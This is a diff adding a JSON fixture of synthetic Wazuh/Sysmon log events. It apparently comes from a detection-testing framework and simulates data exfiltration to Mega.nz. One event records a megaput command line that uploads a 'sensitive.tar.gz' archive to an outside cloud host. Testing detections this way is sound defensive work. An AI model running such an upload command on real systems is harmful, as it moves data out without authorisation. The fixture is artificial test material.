@@ -1,0 +1,147 @@
+{
+  "_metadata": {
+    "attack_id": "T1567.002",
+    "variation": "004",
+    "name": "Exfiltration to Mega.nz - MEGAcmd CLI",
+    "description": "Upload files to Mega.nz using megaput CLI tool",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "exfiltration",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Linux Sysmon Event 1 - megaput upload",
+      "sequence": 1,
+      "timestamp": "2026-02-10T18:24:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T18:24:00.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 1: Mega.nz Exfiltration",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1567.002"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration Over Web Service"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "GW01",
+          "ip": "198.51.100.1"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707589440.000001",
+        "decoder": {
+          "name": "linux_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-10 18:24:00.000",
+            "processGuid": "{12345678-1234-65c7-0048-000000000400}",
+            "processId": "15789",
+            "image": "/usr/bin/megaput",
+            "commandLine": "megaput --path /exfil/sensitive.tar.gz /tmp/sensitive.tar.gz",
+            "currentDirectory": "/tmp",
+            "user": "admin2",
+            "hashes": "SHA256=89ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF01234567",
+            "parentProcessGuid": "{12345678-1234-65c7-0000-000000000400}",
+            "parentProcessId": "15700",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 9,
+        "fomorian_campaign": 28,
+        "fomorian_technique": "T1567.002",
+        "fomorian_technique_name": "Exfiltration to Mega.nz - MEGAcmd CLI"
+      }
+    },
+    {
+      "_comment": "Linux Sysmon Event 3 - HTTPS to mega.nz",
+      "sequence": 2,
+      "timestamp": "2026-02-10T18:24:02.000Z",
+      "log": {
+        "timestamp": "2026-02-10T18:24:02.000+0000",
+        "rule": {
+          "level": 8,
+          "description": "Sysmon - Event 3: Network Connection to Mega.nz",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1567.002"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration Over Web Service"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "GW01",
+          "ip": "198.51.100.1"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707589442.000001",
+        "decoder": {
+          "name": "linux_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-10 18:24:02.000",
+            "processGuid": "{12345678-1234-65c7-0048-000000000400}",
+            "processId": "15789",
+            "image": "/usr/bin/megaput",
+            "user": "admin2",
+            "protocol": "tcp",
+            "initiated": "true",
+            "sourceIsIpv6": "false",
+            "sourceIp": "198.51.100.1",
+            "sourceHostname": "GW01.corp.local",
+            "sourcePort": "49567",
+            "destinationIsIpv6": "false",
+            "destinationIp": "31.216.147.59",
+            "destinationHostname": "mega.nz",
+            "destinationPort": "443"
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 9,
+        "fomorian_campaign": 28,
+        "fomorian_technique": "T1567.002",
+        "fomorian_technique_name": "Exfiltration to Mega.nz - MEGAcmd CLI"
+      }
+    }
+  ]
+}
